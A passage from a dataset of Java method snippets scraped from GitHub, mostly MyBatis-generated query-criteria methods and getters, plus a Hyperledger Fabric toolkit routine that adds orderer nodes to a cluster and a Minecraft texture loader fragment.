"https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStatusGreaterThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStatusGreaterThanOrEqualTo(Integer value) {            addCriterion(\"status >=\", value, \"status\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStatusLessThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStatusLessThan(Integer value) {            addCriterion(\"status <\", value, \"status\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStatusLessThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStatusLessThanOrEqualTo(Integer value) {            addCriterion(\"status <=\", value, \"status\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStatusIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStatusIn(List<Integer> values) {            addCriterion(\"status in\", values, \"status\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStatusNotIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStatusNotIn(List<Integer> values) {            addCriterion(\"status not in\", values, \"status\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStatusBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStatusBetween(Integer value1, Integer value2) {            addCriterion(\"status between\", value1, value2, \"status\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStatusNotBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStatusNotBetween(Integer value1, Integer value2) {            addCriterion(\"status not between\", value1, value2, \"status\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andSortIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSortIsNull() {            addCriterion(\"sort is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andSortIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSortIsNotNull() {            addCriterion(\"sort is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andSortEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSortEqualTo(Integer value) {            addCriterion(\"sort =\", value, \"sort\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andSortNotEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSortNotEqualTo(Integer value) {            addCriterion(\"sort <>\", value, \"sort\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andSortGreaterThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSortGreaterThan(Integer value) {            addCriterion(\"sort >\", value, \"sort\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andSortGreaterThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSortGreaterThanOrEqualTo(Integer value) {            addCriterion(\"sort >=\", value, \"sort\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andSortLessThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSortLessThan(Integer value) {            addCriterion(\"sort <\", value, \"sort\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andSortLessThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSortLessThanOrEqualTo(Integer value) {            addCriterion(\"sort <=\", value, \"sort\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andSortIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSortIn(List<Integer> values) {            addCriterion(\"sort in\", values, \"sort\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andSortNotIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSortNotIn(List<Integer> values) {            addCriterion(\"sort not in\", values, \"sort\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andSortBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSortBetween(Integer value1, Integer value2) {            addCriterion(\"sort between\", value1, value2, \"sort\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andSortNotBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSortNotBetween(Integer value1, Integer value2) {            addCriterion(\"sort not between\", value1, value2, \"sort\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "getCondition", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getCondition() {            return condition;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "        public Object getValue() {            return value;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getSecondValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "        public Object getSecondValue() {            return secondValue;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "isNoValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isNoValue() {            return noValue;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "isSingleValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isSingleValue() {            return singleValue;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "isBetweenValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isBetweenValue() {            return betweenValue;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "isListValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isListValue() {            return listValue;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getTypeHandler", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getTypeHandler() {            return typeHandler;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getId() {    return id;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/keygen/Planet.java", "stars": "15", "class": {"name": "Planet", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setId", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setId(Integer id) {    this.id = id;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/keygen/Planet.java", "stars": "15", "class": {"name": "Planet", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getName() {    return name;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/keygen/Planet.java", "stars": "15", "class": {"name": "Planet", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setName(String name) {    this.name = name;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/keygen/Planet.java", "stars": "15", "class": {"name": "Planet", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getCode() {    return code;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/keygen/Planet.java", "stars": "15", "class": {"name": "Planet", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setCode(String code) {    this.code = code;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/keygen/Planet.java", "stars": "15", "class": {"name": "Planet", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "ordererExtend", "params": ["Map<String,String>", "InitConfigEntity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void ordererExtend(Map<String, String> newOrdererHostConfig, InitConfigEntity configEntity) {        // log.info(\"\u4e3a\u65b0\u589e orderer \u751f\u6210\u8bc1\u4e66\");        log.info(\"Generate certificate for new orderer\");        // \u751f\u6210\u8bc1\u4e66        try {            fabricConfigGen.configTxGen(configEntity);            fabricConfigGen.cryptoGen(configEntity);            configFileGen.createExtendCerts();        } catch (Exception e) {            // log.error(\"\u4e3a\u65b0\u589e\u7684 orderer \u8282\u70b9\u751f\u6210\u8bc1\u4e66\u5f02\u5e38\", e);            log.error(\"Exception when generate certificate for new orderer node\", e);            e.printStackTrace();            return;        }        // log.info(\"\u4e3a\u65b0\u589e orderer \u751f\u6210 docker \u76f8\u5173\u6587\u4ef6\");        log.info(\"Generate docker files for new orderer\");        // \u751f\u6210 docker-compose-order-xxxx.yaml \u548c start-order.sh \u6587\u4ef6        Map<String, String> filePathMap = new HashMap<>(16);        // \u6309\u673a\u5668IP\u5206\u7ec4        Map<String, List<String>> orderGroups = dockerConfigGen.groupHostByIp(newOrdererHostConfig);        for (String orderServerIp : orderGroups.keySet()) {            // \u6bcf\u4e2a IP \u4e00\u4e2a docker-compose \u6587\u4ef6            try {                String folderName = UUID.randomUUID().toString();                folderName = StringUtils.deleteAny(folderName, \"-\");                folderName = orderServerIp + \"-new-\" + folderName;                String filePath = dockerConfigGen.createOrdererYamlFile(configEntity, orderServerIp, orderGroups.get(orderServerIp), \"order-\" + folderName);                String parentPath = new File(filePath).getParent();                filePathMap.put(orderServerIp, parentPath);            } catch (IOException e) {                e.printStackTrace();            }        }        // log.info(\"\u5c06\u65b0\u751f\u6210\u7684\u8bc1\u4e66\u62f7\u8d1d\u5230\u4e3b\u8282\u70b9\u5b89\u88c5\u76ee\u5f55\");        log.info(\"Copy the newly generated certificate to the master node installation directory\");        fileService.masterCopyCryptoConfig();        fileService.masterCopyConfigtxFile();        // \u542f\u52a8\u4e00\u4e2a cli \u5bb9\u5668        // log.info(\"\u4e3b\u8282\u70b9\u521b\u5efacli\u5bb9\u5668\");        log.info(\"The master node creates a cli container\");        if (!fabricCliService.createCliContainer(modeService.getInstallPath() + \"cli\", configEntity)) {            // log.error(\"\u521b\u5efacli\u5bb9\u5668\u5931\u8d25\");            log.error(\"Failed to create cli container\");            return;        }        // log.info(\"\u4fee\u6539\u6240\u6709\u5176\u4ed6 orderer \u8282\u70b9\u914d\u7f6e\");        log.info(\"Modify configurations in all other orderer node \");        // \u4fee\u6539\u6240\u6709\u5176\u4ed6 orderer \u8282\u70b9\u914d\u7f6e\uff0c\u5e76\u91cd\u542f        updateOldOrdererContainers(newOrdererHostConfig, configEntity);        // \u6536\u96c6\u6240\u6709\u8282\u70b9\u52a0\u5165\u7684\u901a\u9053        // log.info(\"\u83b7\u53d6\u6240\u6709\u8282\u70b9\u52a0\u5165\u7684\u901a\u9053\u5217\u8868\");        log.info(\"Get the channels list  by all nodes\");        Set<String> channelList = new HashSet<>();        try {            channelList.addAll(fabricCliService.getAllChannels(configEntity));        } catch (IOException e) {            // log.error(\"\u83b7\u53d6\u8282\u70b9\u52a0\u5165\u7684\u6240\u6709\u901a\u9053\u5f02\u5e38\", e);            log.error(\"Exception occur when get  the channels list\", e);            e.printStackTrace();        }        // log.info(\"\u4fee\u6539\u7f51\u7edc\u914d\u7f6e\");        log.info(\"Modify network configuration\");        // \u4fee\u6539\u7f51\u7edc\u914d\u7f6e        // log.info(\"\u5c06\u65b0\u52a0\u5165\u7684 orderer(s) \u52a0\u5165\u7cfb\u7edf\u901a\u9053\");        log.info(\"Add the newly added orderer(s) to the system channel\");        Map<String, String> oldOrdererConfig = updateService.getOldNodeConfigMap(configEntity.getOrdererHostConfig(), newOrdererHostConfig);        for (String newOrdererHost : newOrdererHostConfig.keySet()) {            // log.info(\"\u6269\u5bb9orderer-oldOrdererConfig=\" + JSON.toJSONString(oldOrdererConfig));            log.info(\"Expansion orderer-oldOrdererConfig=\" + JSON.toJSONString(oldOrdererConfig));            oldOrdererConfig.put(newOrdererHost, newOrdererHostConfig.get(newOrdererHost));            // \u5148\u4fee\u6539\u7cfb\u7edf\u901a\u9053            if (!updateService.updateNetworkConfig(configEntity.getNetwork() + \"-sys-channel\", configEntity, oldOrdererConfig)) {                // log.error(String.format(\"\u4e3a\u7cfb\u7edf\u901a\u9053 %s \u66f4\u65b0\u7f51\u7edc\u914d\u7f6e\u5931\u8d25\", configEntity.getNetwork() + \"-sys-channel\"));                log.error(String.format(\"Failed to update network configuration for system channel %s\", configEntity.getNetwork() + \"-sys-channel\"));                return;            }            // \u66f4\u65b0\u4e1a\u52a1\u901a\u9053            if (!CollectionUtils.isEmpty(channelList)) {                for (String channelName : channelList) {                    // log.info(String.format(\"\u5c06\u65b0\u52a0\u5165\u7684 orderer(s) \u52a0\u5165 %s \u901a\u9053\", channelName));                    log.info(String.format(\"Add the new orderer(s) to the %s channel\", channelName));                    if (!updateService.updateNetworkConfig(channelName, configEntity, oldOrdererConfig)) {                        // log.error(String.format(\"\u4e3a\u901a\u9053 %s \u66f4\u65b0\u7f51\u7edc\u914d\u7f6e\u5931\u8d25\", channelName));                        log.error(String.format(\"Failed to update network configuration for channel %s\", channelName));                    }                }            }        }        // log.info(\"\u83b7\u53d6\u6700\u65b0\u521b\u4e16\u5757\");        log.info(\"Get the latest genesis block\");        if (!fabricCliService.fetchGenesisBlock(configEntity)) {            // log.error(\"\u83b7\u53d6\u521b\u4e16\u5757\u53d1\u751f\u9519\u8bef\");            log.error(\"Error occur when fetch genesis block\");        }        // log.info(\"\u6ce8\u518c orderer \u8282\u70b9\u89d2\u8272\");        log.info(\"Register the orderer role\");        List<String> ports = new ArrayList<>();        for (String ip : orderGroups.keySet()) {            List<String> hostList = orderGroups.get(ip);            for (String host : hostList) {                int index = host.lastIndexOf(\":\");                ports.add(host.substring(index + 1));            }            this.rolesBiz.addRole(RoleEnum.ORDER, \"http://\" + ip + \":8080\", ip, ports);        }        for (String ip : filePathMap.keySet()) {            String path = filePathMap.get(ip);            String folderName = new File(path).getName();            if (NetUtil.ipIsMine(ip)) {                fileService.copyFiles(RoleEnum.ORDER, ip, folderName, modeService.getInstallPath(), folderName, configEntity, null);                this.rolesBiz.setServerStatus(ip, InstallStatusEnum.DOWNLOADED);            } else {                // log.info(\"\u4e3a\u65b0\u589e orderer \u6253\u5305\u5b89\u88c5\u5305\");                log.info(\"Package  for new orderer\");                String packFilePath = fileService.packExtendNodeFiles(ip, folderName, RoleEnum.ORDER, configEntity);                // \u53d1\u9001\u5230\u8282\u70b9\u542f\u52a8                // log.info(\"\u5c06\u751f\u6210\u7684\u6587\u4ef6\u5305\u53d1\u9001\u5230\u65b0\u589e orderer \u8282\u70b9\");                log.info(\"Send the package to the new orderer node\");                remoteService.pushSlaveInstallPackage(ip, packFilePath, configEntity);            }        }        // log.info(\"\u542f\u52a8 orderer \u8282\u70b9\");        log.info(\"Start the orderer node\");        // \u7b49\u5f85\u8282\u70b9\u542f\u52a8\u6210\u529f        List<ServerEntity> serverList = this.rolesBiz.getRolesMap().get(RoleEnum.ORDER);        for (String ip : filePathMap.keySet()) {            // log.info(String.format(\"\u53d1\u9001\u5b89\u88c5\u547d\u4ee4\u5230\u65b0\u589e orderer \u8282\u70b9 %s\", ip));            log.info(String.format(\"Send installation command to new orderer node %s\", ip));            String path = filePathMap.get(ip);            String folderName = new File(path).getName();            // \u5982\u679c\u4e3b\u8282\u70b9\u4e5f\u662f\u6b64\u89d2\u8272\uff0c\u5219\u5148\u5b89\u88c5            if (NetUtil.ipIsMine(ip)) {                Map<String, String> hosts = environmentService.getRoleNeedSetHost(RoleEnum.ORDER, configEntity);                if (installService.startRole(RoleEnum.ORDER, ports, hosts, folderName)) {                    this.rolesBiz.setServerStatus(ip, InstallStatusEnum.SUCCESS);                }            } else {                for (ServerEntity server : serverList) {                    if (server.getHost().equalsIgnoreCase(ip)) {                        // \u53d1\u9001\u5b89\u88c5\u6307\u4ee4\u7ed9\u4ece\u8282\u70b9                        do {                            HttpInstallResponse response = remoteService.sendInstallCommand(server, RoleEnum.ORDER, folderName, configEntity);                            if (ResponseCode.SUCCESS.getCode().equals(response.getCode())) {                                // log.warn(String.format(\"\u53d1\u9001\u5b89\u88c5\u6307\u4ee4\u7ed9 %s \u8282\u70b9\u5b89\u88c5 orderer \u6210\u529f\", ip));                                log.warn(String.format(\"Send installation instructions to %s node to install orderer successfully\", ip));                                this.rolesBiz.setServerStatus(ip, InstallStatusEnum.INSTALLING);                                break;                            }                            // log.warn(String.format(\"\u53d1\u9001\u5b89\u88c5\u6307\u4ee4\u7ed9 %s \u8282\u70b9\u5b89\u88c5 orderer \u5931\u8d25\uff0c\u7a0d\u540e\u91cd\u8bd5...\", ip));                            log.warn(String.format(\"Sending installation instructions to %s node failed to install orderer, try again later...\", ip));                            try {                                Thread.sleep(3000);                            } catch (InterruptedException e) {                                e.printStackTrace();                            }                        } while (true);                        break;                    }                }            }        }        // log.info(\"\u7b49\u5f85\u6240\u6709 orderer \u542f\u52a8\u6210\u529f\");        log.info(\"Wait for all orderers to start successfully\");        while (serverList.stream().anyMatch(s -> s.getStatus() != InstallStatusEnum.SUCCESS)) {            try {                Thread.sleep(5000);            } catch (Exception e) {                e.printStackTrace();            }        }        // log.info(\"\u5c06\u65b0 orderer(s) \u4fe1\u606f\u52a0\u5165\u672c\u5730\u6570\u636e\u5e93\");        log.info(\"Add new orderer(s) information to local database\");        // \u66f4\u65b0\u6570\u636e\u5e93        for (String host : newOrdererHostConfig.keySet()) {            String ip = newOrdererHostConfig.get(host);            int index = ip.lastIndexOf(\":\");            String port = ip.substring(index + 1);            ip = ip.substring(0, index);            NodeDO nodeDO = new NodeDO();            nodeDO.setOrgMspId(configEntity.getOrgMSPID());            nodeDO.setRole(RoleEnum.ORDER);            nodeDO.setHostName(host);            nodeDO.setIp(ip);            nodeDO.setPort(Integer.parseInt(port));            nodeDO.setStatus(InstallStatusEnum.SUCCESS);            try {                this.checkPointDb.addNodeRecord(nodeDO);            } catch (SQLException e) {                // log.error(String.format(\"\u6dfb\u52a0\u65b0 orderer \u8282\u70b9 %s \u8bb0\u5f55\u5230\u6570\u636e\u5e93\u5f02\u5e38\", host), e);                log.error(String.format(\"Exception when adding a new orderer node %s to the database\", host), e);                e.printStackTrace();            }        }    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/biz/OrdererExtendBiz.java", "stars": "7", "class": {"name": "OrdererExtendBiz", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "updateOldOrdererContainers", "params": ["Map<String,String>", "InitConfigEntity"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void updateOldOrdererContainers(Map<String, String> newOrdererHostConfig, InitConfigEntity configEntity) {        Map<String, String> newHosts = new HashMap<>(16);        for (String host : newOrdererHostConfig.keySet()) {            String ipPort = newOrdererHostConfig.get(host);            String ip = ipPort.substring(0, ipPort.lastIndexOf(\":\"));            newHosts.put(host, ip);        }        Map<String, String> needSendIps = new HashMap<>(16);        for (String newHost : newOrdererHostConfig.keySet()) {            for (String curHost : configEntity.getOrdererHostConfig().keySet()) {                String curIp = configEntity.getOrdererHostConfig().get(curHost);                curIp = curIp.substring(0, curIp.lastIndexOf(\":\"));                if (!curHost.equalsIgnoreCase(newHost)) {                    needSendIps.put(curHost, curIp);                }            }        }        // \u5373\u4f7f\u672c\u673a\u4e5f\u53ef\u4ee5\u53d1\u9001\u6b64\u547d\u4ee4\u66f4\u65b0        for (String oldHost : needSendIps.keySet()) {            String ip = needSendIps.get(oldHost);            // \u53d1\u9001\u66f4\u65b0 orderer \u7684\u547d\u4ee4            UpdateCmd cmd = new UpdateCmd();            cmd.setRole(RoleEnum.ORDER);            cmd.setHosts(newHosts);            cmd.setPeerHostConfig(newOrdererHostConfig);            cmd.setCurrentHost(oldHost);            //\u53d1\u9001\u66f4\u65b0host\u811a\u672c            String updateOrdererHostPath = modeService.getInitDir() + \"template\" + File.separator + \"updateOrdererHost.sh\";            if (NetUtil.ipIsMine(ip)) {                String shDesPath = \"/var/run/updateOrdererHost.sh\";                try {                    FileUtils.copyFile(new File(updateOrdererHostPath), new File(shDesPath));                    installBiz.updateOrderers(cmd);                } catch (IOException e) {                    // log.error(\"\u590d\u5236updateOrdererHost.sh\u6587\u4ef6\u53d1\u751f\u5f02\u5e38\");                    log.error(\"An exception occurred while copying updateOrdererHost.sh file\");                    e.printStackTrace();                }            } else {                int retryInit = 0;                int retryTotal = 10;                do {                    if (retryTotal == retryInit) {                        // log.error(\"\u91cd\u8bd5\u8d85\u8fc7\u6b21\u6570\");                        log.error(\"Error due to more retries\");                        break;                    }                    String result = this.httpClient.sendFileAndJson(\"http://\" + ip + \":8080/v1/install/update\", updateOrdererHostPath, JSONObject.toJSONString(cmd));                    if (!StringUtils.isEmpty(result)) {                        HttpInstallResponse response = JSONObject.parseObject(result, HttpInstallResponse.class);                        if (ResponseCode.SUCCESS.getCode().equalsIgnoreCase(response.getCode())) {                            break;                        }                    }                    // log.error(String.format(\"\u53d1\u9001\u66f4\u65b0 orderer \u6307\u4ee4\u5230\u8282\u70b9 %s \u8fd4\u56de\u9519\u8bef, \u7a0d\u540e\u91cd\u8bd5\", ip));                    log.error(String.format(\"Receive error from node %s when command to update, try again later\", ip));                    try {                        Thread.sleep(3000);                    } catch (InterruptedException e) {                        e.printStackTrace();                    }                    retryInit++;                } while (true);            }        }    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/biz/OrdererExtendBiz.java", "stars": "7", "class": {"name": "OrdererExtendBiz", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getIdsToLoad", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<SpriteIdentifier>", "snippet": "\tpublic List<SpriteIdentifier> getIdsToLoad() {\t\t//System.out.println(ids);\t\treturn ids;\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/tile/provider/BasicTileProvider.java", "stars": "3", "class": {"name": "BasicTileProvider", "extends": null, "implements": ["TileProvider"], "modifiers": ["public"]}}, {"method_name": "load", "params": ["Function<SpriteIdentifier,Sprite>"], "throws": null, "modifiers": ["public"], "return_type": "Sprite", "snippet": "\tpublic Sprite[] load(Function<SpriteIdentifier, Sprite> textureGetter) {\t\tSprite[] sprites = new Sprite[ids.size()];\t\tfor(int i = 0; i < ids.size(); i++) {\t\t\tsprites[i] = 